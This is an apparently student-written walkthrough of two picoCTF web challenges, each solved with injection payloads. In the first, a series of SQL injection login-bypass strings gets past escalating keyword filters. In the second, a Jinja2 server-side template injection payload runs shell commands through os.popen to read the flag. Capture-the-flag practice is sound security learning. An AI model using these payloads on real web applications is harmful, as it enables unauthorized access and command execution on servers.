# 1. Web Gauntlet 

Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:58384/ http://shape-facility.picoctf.net:58384/filter.php

## Solution:

Open the given link ```http://shape-facility.picoctf.net:52907/``` 
We have to login as admin but we don’t have a password 

### Test login:
**Username-** admin
**Password-** hola

The SQL statement printed is 
```SELECT * FROM users WHERE username='admin ' AND password=‘hola'``` 

Using the website given ```http://shape-facility.picoctf.net:52827/filter.php``` it shows ```Round1: or```

### Round 1/5:

**Username-** admin' --
**Password-** ummmm 

```-- ``` comments out the password check so the query is now 
```SELECT * FROM users WHERE username='admin' --' AND password=‘ummmm'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows  ```Round2: or and like = --```

After this ```-- ``` stopped working so Im assuming the things that are on ```http://shape-facility.picoctf.net:52827/filter.php``` are what can no longer be used. 

### Round 2/5:

**Username-** admin’/*
**Password-** idk

```/* ``` is a multi-line comment which comments out the password check so the query is now 
```SELECT * FROM users WHERE username='admin'/*' AND password=‘idk'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round3: or and = like > < --```

### Round 3/5:

Because the last round didn’t mention that the same expression couldn’t be used so I used the same username 

**Username-** admin’/*
**Password-** k

The query is now,
```SELECT * FROM users WHERE username='admin'/*' AND password='k'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round4: or and = like > < -- admin```

### Round 4/5:

**Username-** admi'||'n'/*
**Password-** yes

Use ```||``` to concatenate ```admi``` and ```n``` so the query is now,
```SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘yes'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, it shows ```Round5: or and = like > < -- union admin```


### Round 5/5:

Because the last round didn’t mention that the same expression couldn’t be used so I used the same username

**Username-** admi'||'n'/*
**Password-** done

The query is now, 
```SELECT * FROM users WHERE username='admi'||'n'/*' AND password=‘done'```

On reloading ```http://shape-facility.picoctf.net:52827/filter.php```, we finally get the flag. 

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:
- ```--``` is used in SQl for single line comments
- ```/*``` is used for multi-line comments
- ```||``` is used to concatenate two strings 

## Resources:
- [https://www.w3schools.com/sql/sql_comments.asp](url)
- [https://www.geeksforgeeks.org/sql/sql-concatenation-operator/](url)





# 2. SSTI1 

I made a cool website where you can announce whatever you want! Try it out!
I heard templating is a cool and modular way to build web apps! Check out my website here!

**website:*** [http://rescued-float.picoctf.net:53419/](url)

## Solution 

The hint mentions "Server Side Template Injection". 

- In this case, we use the template engine ```Jinja2```

In order to find which template engine is being used I tried a hit and trial method by inputting ```{{7*7}}```. This results in a ```49``` which means the syntax works. 
This means that the server evaluates ```{{   }}``` so it could possibly be ```Jinja2``` or ```Twig```.

I tried ```Jinja2``` first and it worked. 

- I used ```{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}``` from the below mentioned link to get the flag

## Flag:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}
```

## Concepts learnt:
- A **server side template injection** is a vulnerability that occurs when a server renders user input as a template of some sort. It basically replaces certain placeholders according to a certain template.
- **Template engines** take a template and fill in placeholders with actual data to create the final document

## Notes:

- I tried leaking the secret key using ```{{config[“SECRET_KEY"]}}``` but it just returned ```None```
- ```{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('flag')['read']()}}``` work but doesnt print the flag which is how i knew i had to use ```cat flag``` for the id

## Resources:
- [https://medium.com/@bootstrapsecurity/server-side-template-injection-ssti-advanced-exploitation-techniques-2d8ccdf6270f](url)
- [https://onsecurity.io/article/server-side-template-injection-with-jinja2/](url)
  





